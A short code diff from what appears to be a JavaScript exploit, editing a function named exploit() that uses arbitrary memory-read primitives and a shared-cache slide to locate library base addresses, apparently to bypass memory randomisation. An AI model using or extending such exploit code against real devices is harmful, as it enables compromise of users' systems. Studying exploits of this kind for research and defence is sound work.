@@ -677,9 +677,9 @@ function exploit(){
             var straddr = off2addr(segs, memory.u32(Add(imgs, i * 0x20 + 0x18)));
             var fn = function(i)
             {
-                return memory.read(Add(straddr, i), 1);
+                return memory.read(Add(straddr, i), 0x10)[0];
             };
-            var base = Add(memory.read_i64(Add(imgs, i * 0x20),0),cache_slide);
+            var base = Add(memory.read(Add(imgs, i * 0x20),8),cache_slide);
             alert(base)
             //alert("r32"+Add(r32(Add(imgs, i * 0x20),cache_slide)))
             log(fn)
